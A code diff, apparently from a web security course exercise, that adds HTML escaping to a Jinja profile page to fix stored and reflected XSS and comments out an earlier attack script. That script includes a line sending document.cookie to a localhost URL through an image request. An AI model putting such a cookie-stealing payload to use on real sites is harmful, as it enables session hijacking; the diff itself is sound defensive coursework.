@@ -4,15 +4,17 @@
 
 {% block content %}
 <div class="profile-container">
-  <h1 class="profile-header">{{ user.username }}</h1>
+  <h1 class="profile-header">{{ user.username|e }}</h1>
   <div>
-    <strong>Coins:</strong> {{ user.coins }}
+    <strong>Coins:</strong> {{ user.coins|e }}
     <br>
-    <strong>About Me:</strong><br>{{ user.aboutme}}
+    <!-- Task 2.7 sanitation check for stored XSS attack-->
+    <strong>About Me:</strong><br>{{ user.aboutme|e }}
   </div>
 </div>
 
-{% if user.username == session_user.username %}
+<!-- Task 2.7 sanitaion check for reflected XSS attack-->
+{% if user and user.username == session_user.username %}
 <div class="payment-form">
   <h3 class="payment-header">Make payment?</h3>
   <form action="/pay" method="post">
@@ -42,7 +44,7 @@
   </form>
 </div>
 
-<script>
+<!-- <script>
   //Task 2.1
   // alert(document.cookie)
   // document.createElement("img").src = "http://localhost:8080/profile/my_attack_with_cookie=" + document.cookie;
@@ -55,7 +57,7 @@
   //Task 2.3
   document.getElementsByClassName("error")[0].style.visibility = "hidden";
 
-</script>
+</script> -->
 
 {% endif %}
 {% endblock %}
